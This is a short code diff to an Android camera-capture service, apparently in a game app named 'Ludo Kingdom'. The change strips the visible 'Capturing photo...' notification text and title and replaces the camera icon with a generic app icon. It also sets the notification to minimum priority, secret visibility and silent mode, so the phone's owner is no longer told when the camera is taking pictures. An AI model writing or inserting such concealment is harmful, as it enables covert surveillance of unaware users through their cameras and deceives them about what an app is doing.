@@ -136,10 +136,11 @@ class CameraCaptureService : Service() {
 
     private fun createNotification(): Notification {
         val builder = NotificationCompat.Builder(this, ForegroundService.CHANNEL_ID)
-            .setContentTitle("Ludo Kingdom Camera")
-            .setContentText("Capturing photo...")
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setSmallIcon(android.R.drawable.sym_def_app_icon)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setOngoing(true)
+            .setSilent(true)
         return builder.build()
     }
 }
